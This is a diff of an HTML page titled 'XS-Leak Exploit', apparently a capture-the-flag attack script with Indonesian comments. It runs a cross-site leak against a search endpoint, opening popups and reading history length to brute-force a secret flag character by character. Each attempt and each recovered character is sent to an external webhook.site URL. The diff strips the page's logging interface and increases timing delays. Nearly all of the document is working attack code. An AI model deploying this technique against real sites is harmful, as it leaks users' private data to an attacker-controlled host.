@@ -1,34 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>XS-Leak Exploit</title>
-</head>
+<html>
 <body>
-    <h1 id="status">Menjalankan Eksploitasi...</h1>
-    <div id="logs" style="font-family: monospace; background: #eee; padding: 10px;"></div>
-
     <script>
-        // --- KONFIGURASI ---
-        const targetBase = "https://ponder.cbd2026.cloud/search?q=";
+        // Gunakan http:// jika https:// bermasalah dengan sertifikat
+        const targetBase = "http://ponder.cbd2026.cloud/search?q=";
         const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; 
+        
+        // COBA VARIASI: Jika "flag{" gagal, coba "{" atau langsung mulai brute force
         let flag = "flag{"; 
         const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
-        
-        const log = (msg) => {
-            console.log(msg);
-            document.getElementById('logs').innerHTML += `<div>${msg}</div>`;
-        };
 
-        // Kirim sinyal awal ke webhook
-        fetch(`${webhook}?status=STARTING_EXPLOIT&ip=bot_target`);
+        fetch(`${webhook}?status=ULTRADEBUG_START&prefix=${flag}`);
 
         async function tryChar(char) {
             return new Promise((resolve) => {
                 const query = flag + char;
                 const win = window.open(`${targetBase}${encodeURIComponent(query)}`);
 
-                // JEDA KRUSIAL: Harus lebih lama dari 1000ms (karena setTimeout target adalah 1s)
                 setTimeout(() => {
                     if (!win) {
                         fetch(`${webhook}?error=POPUP_BLOCKED`);
@@ -37,17 +25,11 @@
                     }
 
                     try {
-                        /**
-                         * LOGIKA UTAMA:
-                         * Saat pertama kali dibuka, history.length = 1.
-                         * Jika hasil pencarian tepat 1 (Match), target melakukan redirect.
-                         * Redirect akan menambah history.length menjadi 2.
-                         */
                         const hLen = win.history.length;
                         win.close();
                         
-                        // Kirim log debug ke webhook
-                        fetch(`${webhook}?char=${char}&h_len=${hLen}`);
+                        // LOG SEMUA PERCOBAAN: Cek di Webhook apakah ada yang h_len=2
+                        fetch(`${webhook}?try=${encodeURIComponent(query)}&h=${hLen}`);
 
                         if (hLen > 1) {
                             resolve(true);
@@ -55,46 +37,26 @@
                             resolve(false);
                         }
                     } catch (e) {
-                        // Jika akses ke history error (Cross-Origin), biasanya tetap resolve false
                         win.close();
                         resolve(false);
                     }
-                }, 2500); // Memberi waktu bot bernapas dan melakukan redirect
+                }, 3000); // Naikkan jeda ke 3 detik untuk kestabilan
             });
         }
 
         async function run() {
-            log(`Menebak karakter setelah: <strong>${flag}</strong>`);
-            
             for (let char of alphabet) {
-                log(`Mencoba: ${char}`);
-                const found = await tryChar(char);
-                
-                if (found) {
+                if (await tryChar(char)) {
                     flag += char;
-                    log(`Ditemukan karakter baru: <strong>${flag}</strong>`);
-                    
-                    // Kirim hasil yang ditemukan ke webhook
-                    fetch(`${webhook}?found_flag=${encodeURIComponent(flag)}`);
-
-                    if (char === "}") {
-                        log("Eksploitasi Selesai!");
-                        fetch(`${webhook}?status=FINISHED&flag=${encodeURIComponent(flag)}`);
-                        return;
-                    }
-                    
-                    // Mulai lagi dari awal alphabet untuk karakter berikutnya
+                    fetch(`${webhook}?FOUND_FLAG=${encodeURIComponent(flag)}`);
+                    if (char === "}") return;
                     return run();
                 }
             }
-            log("Gagal menemukan karakter selanjutnya dalam satu putaran.");
-            fetch(`${webhook}?status=STUCK&last_flag=${encodeURIComponent(flag)}`);
+            fetch(`${webhook}?status=FAILED_ROUND&last_tried=${flag}`);
         }
 
-        // Jalankan saat halaman siap
-        window.onload = () => {
-            run();
-        };
+        window.onload = run;
     </script>
 </body>
 </html>
